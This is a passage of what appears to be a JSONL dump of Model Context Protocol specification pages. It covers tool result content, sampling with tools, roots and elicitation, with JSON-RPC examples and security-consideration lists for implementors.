\"id\": 5,\n  \"error\": {\n    \"code\": -32002,\n    \"message\": \"Resource not found\",\n    \"data\": {\n      \"uri\": \"file:///nonexistent.txt\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Servers **MUST** validate all resource URIs\n2. Access controls **SHOULD** be implemented for sensitive resources\n3. Binary data **MUST** be properly encoded\n4. Resource permissions **SHOULD** be checked before operations\n"}

In this case, the tool will return a URI that can be subscribed to or fetched by the client:\n\n```json\n{\n  \"type\": \"resource_link\",\n  \"uri\": \"file:///project/src/main.rs\",\n  \"name\": \"main.rs\",\n  \"description\": \"Primary application entry point\",\n  \"mimeType\": \"text/x-rust\",\n  \"annotations\": {\n    \"audience\": [\"assistant\"],\n    \"priority\": 0.9\n  }\n}\n```\n\nResource links support the same [Resource annotations](/specification/2025-06-18/server/resources#annotations) as regular resources to help clients understand how to use them.\n\n<Info>\n  Resource links returned by tools are not guaranteed to appear in the results\n  of a `resources/list` request.\n</Info>\n\n#### Embedded Resources\n\n[Resources](/specification/2025-06-18/server/resources) **MAY** be embedded to provide additional context\nor data using a suitable [URI scheme](./resources#common-uri-schemes). Servers that use embedded resources **SHOULD** implement the `resources` capability:\n\n```json\n{\n  \"type\": \"resource\",\n  \"resource\": {\n    \"uri\": \"file:///project/src/main.rs\",\n    \"mimeType\": \"text/x-rust\",\n    \"text\": \"fn main() {\\n    println!(\\\"Hello world!\\\");\\n}\",\n    \"annotations\": {\n      \"audience\": [\"user\", \"assistant\"],\n      \"priority\": 0.7,\n      \"lastModified\": \"2025-05-03T14:30:00Z\"\n    }\n  }\n}\n```\n\nEmbedded resources support the same [Resource annotations](/specification/2025-06-18/server/resources#annotations) as regular resources to help clients understand how to use them.\n\n#### Structured Content\n\n**Structured** content is returned as a JSON object in the `structuredContent` field of a result.\n\nFor backwards compatibility, a tool that returns structured content SHOULD also return the serialized JSON in a TextContent block.\n\n#### Output Schema\n\nTools may also provide an output schema for validation of structured results.\nIf an output schema is provided:\n\n- Servers **MUST** provide structured results that conform to this schema.\n- Clients **SHOULD** validate structured results against this schema.\n\nExample tool with output schema:\n\n```json\n{\n  \"name\": \"get_weather_data\",\n  \"title\": \"Weather Data Retriever\",\n  \"description\": \"Get current weather data for a location\",\n  \"inputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"location\": {\n        \"type\": \"string\",\n        \"description\": \"City name or zip code\"\n      }\n    },\n    \"required\": [\"location\"]\n  },\n  \"outputSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"temperature\": {\n        \"type\": \"number\",\n        \"description\": \"Temperature in celsius\"\n      },\n      \"conditions\": {\n        \"type\": \"string\",\n        \"description\": \"Weather conditions description\"\n      },\n      \"humidity\": {\n        \"type\": \"number\",\n        \"description\": \"Humidity percentage\"\n      }\n    },\n    \"required\": [\"temperature\", \"conditions\", \"humidity\"]\n  }\n}\n```\n\nExample valid response for this tool:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"{\\\"temperature\\\": 22.5, \\\"conditions\\\": \\\"Partly cloudy\\\", \\\"humidity\\\": 65}\"\n      }\n    ],\n    \"structuredContent\": {\n      \"temperature\": 22.5,\n      \"conditions\": \"Partly cloudy\",\n      \"humidity\": 65\n    }\n  }\n}\n```\n\nProviding an output schema helps clients and LLMs understand and properly handle structured tool outputs by:\n\n- Enabling strict schema validation of responses\n- Providing type information for better integration with programming languages\n- Guiding clients and LLMs to properly parse and utilize the returned data\n- Supporting better documentation and developer experience\n\n## Error Handling\n\nTools use two error reporting mechanisms:\n\n1. **Protocol Errors**: Standard JSON-RPC errors for issues like:\n   - Unknown tools\n   - Invalid arguments\n   - Server errors\n\n2. **Tool Execution Errors**: Reported in tool results with `isError: true`:\n   - API failures\n   - Invalid input data\n   - Business logic errors\n\nExample protocol error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Unknown tool: invalid_tool_name\"\n  }\n}\n```\n\nExample tool execution error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"Failed to fetch weather data: API rate limit exceeded\"\n      }\n    ],\n    \"isError\": true\n  }\n}\n```\n\n## Security Considerations\n\n1. Servers **MUST**:\n   - Validate all tool inputs\n   - Implement proper access controls\n   - Rate limit tool invocations\n   - Sanitize tool outputs\n\n2. Clients **SHOULD**:\n   - Prompt for user confirmation on sensitive operations\n   - Show tool inputs to the user before calling the server, to avoid malicious or\n     accidental data exfiltration\n   - Validate tool results before passing to LLM\n   - Implement timeouts for tool calls\n   - Log tool usage for audit purposes\n"}
{"source":"github","repo":"mcp-spec","path":"docs/specification/2025-06-18/index.mdx","content":"---\ntitle: Specification\n---\n\n<div id=\"enable-section-numbers\" />\n\n[Model Context Protocol](https://modelcontextprotocol.io) (MCP) is an open protocol that\nenables seamless integration between LLM applications and external data sources and\ntools. Whether you're building an AI-powered IDE, enhancing a chat interface, or creating\ncustom AI workflows, MCP provides a standardized way to connect LLMs with the context\nthey need.\n\nThis specification defines the authoritative protocol requirements, based on the\nTypeScript schema in\n[schema.ts](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-06-18/schema.ts).\n\nFor implementation guides and examples, visit\n[modelcontextprotocol.io](https://modelcontextprotocol.io).\n\nThe key words \"MUST\", \"MUST NOT\", \"REQUIRED\", \"SHALL\", \"SHALL NOT\", \"SHOULD\", \"SHOULD\nNOT\", \"RECOMMENDED\", \"NOT RECOMMENDED\", \"MAY\", and \"OPTIONAL\" in this document are to be\ninterpreted as described in [BCP 14](https://datatracker.ietf.org/doc/html/bcp14)\n[[RFC2119](https://datatracker.ietf.org/doc/html/rfc2119)]\n[[RFC8174](https://datatracker.ietf.org/doc/html/rfc8174)] when, and only when, they\nappear in all capitals, as shown here.\n\n## Overview\n\nMCP provides a standardized way for applications to:\n\n- Share contextual information with language models\n- Expose tools and capabilities to AI systems\n- Build composable integrations and workflows\n\nThe protocol uses [JSON-RPC](https://www.jsonrpc.org/) 2.0 messages to establish\ncommunication between:\n\n- **Hosts**: LLM applications that initiate connections\n- **Clients**: Connectors within the host application\n- **Servers**: Services that provide context and capabilities\n\nMCP takes some inspiration from the\n[Language Server Protocol](https://microsoft.github.io/language-server-protocol/), which\nstandardizes how to add support for programming languages across a whole ecosystem of\ndevelopment tools. In a similar way, MCP standardizes how to integrate additional context\nand tools into the ecosystem of AI applications.\n\n## Key Details\n\n### Base Protocol\n\n- [JSON-RPC](https://www.jsonrpc.org/) message format\n- Stateful connections\n- Server and client capability negotiation\n\n### Features\n\nServers offer any of the following features to clients:\n\n- **Resources**: Context and data, for the user or the AI model to use\n- **Prompts**: Templated messages and workflows for users\n- **Tools**: Functions for the AI model to execute\n\nClients may offer the following features to servers:\n\n- **Sampling**: Server-initiated agentic behaviors and recursive LLM interactions\n- **Roots**: Server-initiated inquiries into uri or filesystem boundaries to operate in\n- **Elicitation**: Server-initiated requests for additional information from users\n\n### Additional Utilities\n\n- Configuration\n- Progress tracking\n- Cancellation\n- Error reporting\n- Logging\n\n## Security and Trust & Safety\n\nThe Model Context Protocol enables powerful capabilities through arbitrary data access\nand code execution paths. With this power comes important security and trust\nconsiderations that all implementors must carefully address.\n\n### Key Principles\n\n1. **User Consent and Control**\n   - Users must explicitly consent to and understand all data access and operations\n   - Users must retain control over what data is shared and what actions are taken\n   - Implementors should provide clear UIs for reviewing and authorizing activities\n\n2. **Data Privacy**\n   - Hosts must obtain explicit user consent before exposing user data to servers\n   - Hosts must not transmit resource data elsewhere without user consent\n   - User data should be protected with appropriate access controls\n\n3. **Tool Safety**\n   - Tools represent arbitrary code execution and must be treated with appropriate\n     caution.\n     - In particular, descriptions of tool behavior such as annotations should be\n       considered untrusted, unless obtained from a trusted server.\n   - Hosts must obtain explicit user consent before invoking any tool\n   - Users should understand what each tool does before authorizing its use\n\n4. **LLM Sampling Controls**\n   - Users must explicitly approve any LLM sampling requests\n   - Users should control:\n     - Whether sampling occurs at all\n     - The actual prompt that will be sent\n     - What results the server can see\n   - The protocol intentionally limits server visibility into prompts\n\n### Implementation Guidelines\n\nWhile MCP itself cannot enforce these security principles at the protocol level,\nimplementors **SHOULD**:\n\n1. Build robust consent and authorization flows into their applications\n2. Provide clear documentation of security implications\n3. Implement appropriate access controls and data protections\n4. Follow security best practices in their integrations\n5. Consider privacy implications in their feature designs\n\n## Learn More\n\nExplore the detailed specification for each protocol component:\n\n<CardGroup cols={5}>\n  <Card\n    title=\"Architecture\"\n    icon=\"sitemap\"\n    href=\"/specification/2025-06-18/architecture\"\n  />\n  <Card\n    title=\"Base Protocol\"\n    icon=\"code\"\n    href=\"/specification/2025-06-18/basic\"\n  />\n  <Card\n    title=\"Server Features\"\n    icon=\"server\"\n    href=\"/specification/2025-06-18/server\"\n  />\n  <Card\n    title=\"Client Features\"\n    icon=\"user\"\n    href=\"/specification/2025-06-18/client\"\n  />\n  <Card title=\"Contributing\" icon=\"pencil\" href=\"/community/communication\" />\n</CardGroup>\n"}

This flow\nallows clients to maintain control over model access, selection, and permissions while\nenabling servers to leverage AI capabilities&mdash;with no server API keys necessary.\nServers can request text, audio, or image-based interactions and optionally include\ncontext from MCP servers in their prompts.\n\n## User Interaction Model\n\nSampling in MCP allows servers to implement agentic behaviors, by enabling LLM calls to\noccur _nested_ inside other MCP server features.\n\nImplementations are free to expose sampling through any interface pattern that suits\ntheir needs&mdash;the protocol itself does not mandate any specific user interaction\nmodel.\n\n<Warning>\n\nFor trust & safety and security, there **SHOULD** always\nbe a human in the loop with the ability to deny sampling requests.\n\nApplications **SHOULD**:\n\n- Provide UI that makes it easy and intuitive to review sampling requests\n- Allow users to view and edit prompts before sending\n- Present generated responses for review before delivery\n\n</Warning>\n\n## Tools in Sampling\n\nServers can request that the client's LLM use tools during sampling by providing a `tools` array and optional `toolChoice` configuration in their sampling requests. This enables servers to implement agentic behaviors where the LLM can call tools, receive results, and continue the conversation - all within a single sampling request flow.\n\nClients **MUST** declare support for tool use via the `sampling.tools` capability to receive tool-enabled sampling requests. Servers **MUST NOT** send tool-enabled sampling requests to Clients that have not declared support for tool use via the `sampling.tools` capability.\n\n## Capabilities\n\nClients that support sampling **MUST** declare the `sampling` capability during\n[initialization](/specification/draft/basic/lifecycle#initialization):\n\n**Basic sampling:**\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {}\n  }\n}\n```\n\n**With tool use support:**\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {\n      \"tools\": {}\n    }\n  }\n}\n```\n\n**With context inclusion support (soft-deprecated):**\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {\n      \"context\": {}\n    }\n  }\n}\n```\n\n<Note>\n  The `includeContext` parameter values `\"thisServer\"` and `\"allServers\"` are\n  soft-deprecated. Servers **SHOULD** avoid using these values (e.g. can just\n  omit `includeContext` since it defaults to `\"none\"`), and **SHOULD NOT** use\n  them unless the client declares `sampling.context` capability. These values\n  may be removed in future spec releases.\n</Note>\n\n## Protocol Messages\n\n### Creating Messages\n\nTo request a language model generation, servers send a `sampling/createMessage` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What is the capital of France?\"\n        }\n      }\n    ],\n    \"modelPreferences\": {\n      \"hints\": [\n        {\n          \"name\": \"claude-3-sonnet\"\n        }\n      ],\n      \"intelligencePriority\": 0.8,\n      \"speedPriority\": 0.5\n    },\n    \"systemPrompt\": \"You are a helpful assistant.\",\n    \"maxTokens\": 100\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": {\n      \"type\": \"text\",\n      \"text\": \"The capital of France is Paris.\"\n    },\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"endTurn\"\n  }\n}\n```\n\n### Sampling with Tools\n\nThe following diagram illustrates the complete flow of sampling with tools, including the multi-turn tool loop:\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n    participant User\n    participant LLM\n\n    Note over Server,Client: Initial request with tools\n    Server->>Client: sampling/createMessage<br/>(messages + tools)\n\n    Note over Client,User: Human-in-the-loop review\n    Client->>User: Present request for approval\n    User-->>Client: Approve/modify\n\n    Client->>LLM: Forward request with tools\n    LLM-->>Client: Response with tool_use<br/>(stopReason: \"toolUse\")\n\n    Client->>User: Present tool calls for review\n    User-->>Client: Approve tool calls\n    Client-->>Server: Return tool_use response\n\n    Note over Server: Execute tool(s)\n    Server->>Server: Run get_weather(\"Paris\")<br/>Run get_weather(\"London\")\n\n    Note over Server,Client: Continue with tool results\n    Server->>Client: sampling/createMessage<br/>(history + tool_results + tools)\n\n    Client->>User: Present continuation\n    User-->>Client: Approve\n\n    Client->>LLM: Forward with tool results\n    LLM-->>Client: Final text response<br/>(stopReason: \"endTurn\")\n\n    Client->>User: Present response\n    User-->>Client: Approve\n    Client-->>Server: Return final response\n\n    Note over Server: Server processes result<br/>(may continue conversation...)\n```\n\nTo request LLM generation with tool use capabilities, servers include `tools` and optionally `toolChoice` in the request:\n\n**Request (Server -> Client):**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What's the weather like in Paris and London?\"\n        }\n      }\n    ],\n    \"tools\": [\n      {\n        \"name\": \"get_weather\",\n        \"description\": \"Get current weather for a city\",\n        \"inputSchema\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"city\": {\n              \"type\": \"string\",\n              \"description\": \"City name\"\n            }\n          },\n          \"required\": [\"city\"]\n        }\n      }\n    ],\n    \"toolChoice\": {\n      \"mode\": \"auto\"\n    },\n    \"maxTokens\": 1000\n  }\n}\n```\n\n**Response (Client -> Server):**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": [\n      {\n        \"type\": \"tool_use\",\n        \"id\": \"call_abc123\",\n        \"name\": \"get_weather\",\n        \"input\": {\n          \"city\": \"Paris\"\n        }\n      },\n      {\n        \"type\": \"tool_use\",\n        \"id\": \"call_def456\",\n        \"name\": \"get_weather\",\n        \"input\": {\n          \"city\": \"London\"\n        }\n      }\n    ],\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"toolUse\"\n  }\n}\n```\n\n### Multi-turn Tool Loop\n\nAfter receiving tool use requests from the LLM, the server typically:\n\n1. Executes the requested tool uses.\n2. Sends a new sampling request with the tool results appended\n3. Receives the LLM's response (which might contain new tool uses)\n4. Repeats as many times as needed (server might cap the maximum number of iterations, and e.g. pass `toolChoice: {mode: \"none\"}` on the last iteration to force a final result)\n\n**Follow-up request (Server -> Client) with tool results:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What's the weather like in Paris and London?\"\n        }\n      },\n      {\n        \"role\": \"assistant\",\n        \"content\": [\n          {\n            \"type\": \"tool_use\",\n            \"id\": \"call_abc123\",\n            \"name\": \"get_weather\",\n            \"input\": { \"city\": \"Paris\" }\n          },\n          {\n            \"type\": \"tool_use\",\n            \"id\": \"call_def456\",\n            \"name\": \"get_weather\",\n            \"input\": { \"city\": \"London\" }\n          }\n        ]\n      },\n      {\n        \"role\": \"user\",\n        \"content\": [\n          {\n            \"type\": \"tool_result\",\n            \"toolUseId\": \"call_abc123\",\n            \"content\": [\n              {\n                \"type\": \"text\",\n                \"text\": \"Weather in Paris: 18°C, partly cloudy\"\n              }\n            ]\n          },\n          {\n            \"type\": \"tool_result\",\n            \"toolUseId\": \"call_def456\",\n            \"content\": [\n              {\n                \"type\": \"text\",\n                \"text\": \"Weather in London: 15°C, rainy\"\n              }\n            ]\n          }\n        ]\n      }\n    ],\n    \"tools\": [\n      {\n        \"name\": \"get_weather\",\n        \"description\": \"Get current weather for a city\",\n        \"inputSchema\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"city\": { \"type\": \"string\" }\n          },\n          \"required\": [\"city\"]\n        }\n      }\n    ],\n    \"maxTokens\": 1000\n  }\n}\n```\n\n**Final response (Client -> Server):**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": {\n      \"type\": \"text\",\n      \"text\": \"Based on the current weather data:\\n\\n- **Paris**: 18°C and partly cloudy - quite pleasant!\\n- **London**: 15°C and rainy - you'll want an umbrella.\\n\\nParis has slightly warmer and drier conditions today.\"\n    },\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"endTurn\"\n  }\n}\n```\n\n## Message Content Constraints\n\n### Tool Result Messages\n\nWhen a user message contains tool results (type: \"tool_result\"), it **MUST** contain ONLY tool results. Mixing tool results with other content types (text, image, audio) in the same message is not allowed.\n\nThis constraint ensures compatibility with provider APIs that use dedicated roles for tool results (e.g., OpenAI's \"tool\" role, Gemini's \"function\" role).\n\n**Valid - single tool result:**\n\n```json\n{\n  \"role\": \"user\",\n  \"content\": {\n    \"type\": \"tool_result\",\n    \"toolUseId\": \"call_123\",\n    \"content\": [{ \"type\": \"text\", \"text\": \"Result data\" }]\n  }\n}\n```\n\n**Valid - multiple tool results:**\n\n```json\n{\n  \"role\": \"user\",\n  \"content\": [\n    {\n      \"type\": \"tool_result\",\n      \"toolUseId\": \"call_123\",\n      \"content\": [{ \"type\": \"text\", \"text\": \"Result 1\" }]\n    },\n    {\n      \"type\": \"tool_result\",\n      \"toolUseId\": \"call_456\",\n      \"content\": [{ \"type\": \"text\", \"text\": \"Result 2\" }]\n    }\n  ]\n}\n```\n\n**Invalid - mixed content:**\n\n```json\n{\n  \"role\": \"user\",\n  \"content\": [\n    {\n      \"type\": \"text\",\n      \"text\": \"Here are the results:\"\n    },\n    {\n      \"type\": \"tool_result\",\n      \"toolUseId\": \"call_123\",\n      \"content\": [{ \"type\": \"text\", \"text\": \"Result data\" }]\n    }\n  ]\n}\n```\n\n### Tool Use and Result Balance\n\nWhen using tool use in sampling, every assistant message containing `ToolUseContent` blocks **MUST** be followed by a user message that consists entirely of `ToolResultContent` blocks, with each tool use (e.g. with `id: $id`) matched by a corresponding tool result (with `toolUseId: $id`), before any other message.\n\nThis requirement ensures:\n\n- Tool uses are always resolved before the conversation continues\n- Provider APIs can concurrently process multiple tool uses and fetch their results in parallel\n- The conversation maintains a consistent request-response pattern\n\n**Example valid sequence:**\n\n1. User message: \"What's the weather like in Paris and London?\"\n2. Assistant message: `ToolUseContent` (`id: \"call_abc123\", name: \"get_weather\", input: {city: \"Paris\"}`) + `ToolUseContent` (`id: \"call_def456\", name: \"get_weather\", input: {city: \"London\"}`)\n3. User message: `ToolResultContent` (`toolUseId: \"call_abc123\", content: \"18°C, partly cloudy\"`) + `ToolResultContent` (`toolUseId: \"call_def456\", content: \"15°C, rainy\"`)\n4. Assistant message: Text response comparing the weather in both cities\n\n**Invalid sequence - missing tool result:**\n\n1. User message: \"What's the weather like in Paris and London?\"\n2. Assistant message: `ToolUseContent` (`id: \"call_abc123\", name: \"get_weather\", input: {city: \"Paris\"}`) + `ToolUseContent` (`id: \"call_def456\", name: \"get_weather\", input: {city: \"London\"}`)\n3. User message: `ToolResultContent` (`toolUseId: \"call_abc123\", content: \"18°C, partly cloudy\"`) ← Missing result for call_def456\n4. Assistant message: Text response (invalid - not all tool uses were resolved)\n\n## Cross-API Compatibility\n\nThe sampling specification is designed to work across multiple LLM provider APIs (Claude, OpenAI, Gemini, etc.). Key design decisions for compatibility:\n\n### Message Roles\n\nMCP uses two roles: \"user\" and \"assistant\".\n\nTool use requests are sent in CreateMessageResult with the \"assistant\" role.\nTool results are sent back in messages with the \"user\" role.\nMessages with tool results cannot contain other kinds of content.\n\n### Tool Choice Modes\n\n`CreateMessageRequest.params.toolChoice` controls the tool use ability of the model:\n\n- `{mode: \"auto\"}`: Model decides whether to use tools (default)\n- `{mode: \"required\"}`: Model MUST use at least one tool before completing\n- `{mode: \"none\"}`: Model MUST NOT use any tools\n\n### Parallel Tool Use\n\nMCP allows models to make multiple tool use requests in parallel (returning an array of `ToolUseContent`). All major provider APIs support this:\n\n- **Claude**: Supports parallel tool use natively\n- **OpenAI**: Supports parallel tool calls (can be disabled with `parallel_tool_calls: false`)\n- **Gemini**: Supports parallel function calls natively\n\nImplementations wrapping providers that support disabling parallel tool use MAY expose this as an extension, but it is not part of the core MCP specification.\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n    participant User\n    participant LLM\n\n    Note over Server,Client: Server initiates sampling\n    Server->>Client: sampling/createMessage\n\n    Note over Client,User: Human-in-the-loop review\n    Client->>User: Present request for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Client,LLM: Model interaction\n    Client->>LLM: Forward approved request\n    LLM-->>Client: Return generation\n\n    Note over Client,User: Response review\n    Client->>User: Present response for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Server,Client: Complete request\n    Client-->>Server: Return approved response\n```\n\n## Data Types\n\n### Messages\n\nSampling messages can contain:\n\n#### Text Content\n\n```json\n{\n  \"type\": \"text\",\n  \"text\": \"The message content\"\n}\n```\n\n#### Image Content\n\n```json\n{\n  \"type\": \"image\",\n  \"data\": \"base64-encoded-image-data\",\n  \"mimeType\": \"image/jpeg\"\n}\n```\n\n#### Audio Content\n\n```json\n{\n  \"type\": \"audio\",\n  \"data\": \"base64-encoded-audio-data\",\n  \"mimeType\": \"audio/wav\"\n}\n```\n\n### Model Preferences\n\nModel selection in MCP requires careful abstraction since servers and clients may use\ndifferent AI providers with distinct model offerings. A server cannot simply request a\nspecific model by name since the client may not have access to that exact model or may\nprefer to use a different provider's equivalent model.\n\nTo solve this, MCP implements a preference system that combines abstract capability\npriorities with optional model hints:\n\n#### Capability Priorities\n\nServers express their needs through three normalized priority values (0-1):\n\n- `costPriority`: How important is minimizing costs? Higher values prefer cheaper models.\n- `speedPriority`: How important is low latency? Higher values prefer faster models.\n- `intelligencePriority`: How important are advanced capabilities? Higher values prefer\n  more capable models.\n\n#### Model Hints\n\nWhile priorities help select models based on characteristics, `hints` allow servers to\nsuggest specific models or model families:\n\n- Hints are treated as substrings that can match model names flexibly\n- Multiple hints are evaluated in order of preference\n- Clients **MAY** map hints to equivalent models from different providers\n- Hints are advisory&mdash;clients make final model selection\n\nFor example:\n\n```json\n{\n  \"hints\": [\n    { \"name\": \"claude-3-sonnet\" }, // Prefer Sonnet-class models\n    { \"name\": \"claude\" } // Fall back to any Claude model\n  ],\n  \"costPriority\": 0.3, // Cost is less important\n  \"speedPriority\": 0.8, // Speed is very important\n  \"intelligencePriority\": 0.5 // Moderate capability needs\n}\n```\n\nThe client processes these preferences to select an appropriate model from its available\noptions. For instance, if the client doesn't have access to Claude models but has Gemini,\nit might map the sonnet hint to `gemini-1.5-pro` based on similar capabilities.\n\n## Error Handling\n\nClients **SHOULD** return errors for common failure cases:\n\n- User rejected sampling request: `-1`\n- Tool result missing in request: `-32602` (Invalid params)\n- Tool results mixed with other content: `-32602` (Invalid params)\n\nExample errors:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"error\": {\n    \"code\": -1,\n    \"message\": \"User rejected sampling request\"\n  }\n}\n```\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Tool result missing in request\"\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **SHOULD** implement user approval controls\n2. Both parties **SHOULD** validate message content\n3. Clients **SHOULD** respect model preference hints\n4. Clients **SHOULD** implement rate limiting\n5. Both parties **MUST** handle sensitive data appropriately\n\nWhen tools are used in sampling, additional security considerations apply:\n\n6. Servers **MUST** ensure that when replying to a `stopReason: \"toolUse\"`, each `ToolUseContent` item is responded to with a `ToolResultContent` item with a matching `toolUseId`, and that the user message contains only tool results (no other content types)\n7. Both parties **SHOULD** implement iteration limits for tool loops\n"}

Servers can request the list of roots from supporting clients and receive\nnotifications when that list changes.\n\n## User Interaction Model\n\nRoots in MCP are typically exposed through workspace or project configuration interfaces.\n\nFor example, implementations could offer a workspace/project picker that allows users to\nselect directories and files the server should have access to.

This flow allows clients to\nmaintain control over user interactions and data sharing while enabling servers to gather\nnecessary information dynamically.\n\nElicitation supports two modes:\n\n- **Form mode**: Servers can request structured data from users with optional JSON schemas to validate responses\n- **URL mode**: Servers can direct users to external URLs for sensitive interactions that must _not_ pass through the MCP client\n\n## User Interaction Model\n\nElicitation in MCP allows servers to implement interactive workflows by enabling user input\nrequests to occur _nested_ inside other MCP server features.\n\nImplementations are free to expose elicitation through any interface pattern that suits\ntheir needs&mdash;the protocol itself does not mandate any specific user interaction\nmodel.\n\n<Warning>\n\nFor trust & safety and security:\n\n- Servers **MUST NOT** use form mode elicitation to request sensitive information\n- Servers **MUST** use URL mode for interactions involving sensitive information, such as credentials\n\nMCP clients **MUST**:\n\n- Provide UI that makes it clear which server is requesting information\n- Respect user privacy and provide clear decline and cancel options\n- For form mode, allow users to review and modify their responses before sending\n- For URL mode, clearly display the target domain/host and gather user consent before navigation to the target URL\n\n</Warning>\n\n## Capabilities\n\nClients that support elicitation **MUST** declare the `elicitation` capability during\n[initialization](../basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"elicitation\": {\n      \"form\": {},\n      \"url\": {}\n    }\n  }\n}\n```\n\nFor backwards compatibility, an empty capabilities object is equivalent to declaring support for `form` mode only:\n\n```jsonc\n{\n  \"capabilities\": {\n    \"elicitation\": {}, // Equivalent to { \"form\": {} }\n  },\n}\n```\n\nClients declaring the `elicitation` capability **MUST** support at least one mode (`form` or `url`).\n\nServers **MUST NOT** send elicitation requests with modes that are not supported by the client.\n\n## Protocol Messages\n\n### Elicitation Requests\n\nTo request information from a user, servers send an `elicitation/create` request.\n\nAll elicitation requests **MUST** include the following parameters:\n\n| Name      | Type   | Options       | Description                                                                            |\n| --------- | ------ | ------------- | -------------------------------------------------------------------------------------- |\n| `mode`    | string | `form`, `url` | The mode of the elicitation. Optional for form mode (defaults to `\"form\"` if omitted). |\n| `message` | string |               | A human-readable message explaining why the interaction is needed.                     |\n\nThe `mode` parameter specifies the type of elicitation:\n\n- `\"form\"`: In-band structured data collection with optional schema validation. Data is exposed to the client.\n- `\"url\"`: Out-of-band interaction via URL navigation. Data (other than the URL itself) is **not** exposed to the client.\n\nFor backwards compatibility, servers **MAY** omit the `mode` field for form mode elicitation requests. Clients **MUST** treat requests without a `mode` field as form mode.\n\n### Form Mode Elicitation Requests\n\nForm mode elicitation allows servers to collect structured data directly through the MCP client.\n\nForm mode elicitation requests **MUST** either specify `mode: \"form\"` or omit the `mode` field, and include these additional parameters:\n\n| Name              | Type   | Description                                                    |\n| ----------------- | ------ | -------------------------------------------------------------- |\n| `requestedSchema` | object | A JSON Schema defining the structure of the expected response. |\n\n#### Requested Schema\n\nThe `requestedSchema` parameter allows servers to define the structure of the expected\nresponse using a restricted subset of JSON Schema.\n\nTo simplify client user experience, form mode elicitation schemas are limited to flat objects\nwith primitive properties only.\n\nThe schema is restricted to these primitive types:\n\n1. **String Schema**\n\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"minLength\": 3,\n     \"maxLength\": 50,\n     \"pattern\": \"^[A-Za-z]+$\",\n     \"format\": \"email\",\n     \"default\": \"user@example.com\"\n   }\n   ```\n\n   Supported formats: `email`, `uri`, `date`, `date-time`\n\n2. **Number Schema**\n\n   ```json\n   {\n     \"type\": \"number\", // or \"integer\"\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"minimum\": 0,\n     \"maximum\": 100,\n     \"default\": 50\n   }\n   ```\n\n3. **Boolean Schema**\n\n   ```json\n   {\n     \"type\": \"boolean\",\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"default\": false\n   }\n   ```\n\n4. **Enum Schema**\n\n   Single-select enum (without titles):\n\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite color\",\n     \"enum\": [\"Red\", \"Green\", \"Blue\"],\n     \"default\": \"Red\"\n   }\n   ```\n\n   Single-select enum (with titles):\n\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite color\",\n     \"oneOf\": [\n       { \"const\": \"#FF0000\", \"title\": \"Red\" },\n       { \"const\": \"#00FF00\", \"title\": \"Green\" },\n       { \"const\": \"#0000FF\", \"title\": \"Blue\" }\n     ],\n     \"default\": \"#FF0000\"\n   }\n   ```\n\n   Multi-select enum (without titles):\n\n   ```json\n   {\n     \"type\": \"array\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite colors\",\n     \"minItems\": 1,\n     \"maxItems\": 2,\n     \"items\": {\n       \"type\": \"string\",\n       \"enum\": [\"Red\", \"Green\", \"Blue\"]\n     },\n     \"default\": [\"Red\", \"Green\"]\n   }\n   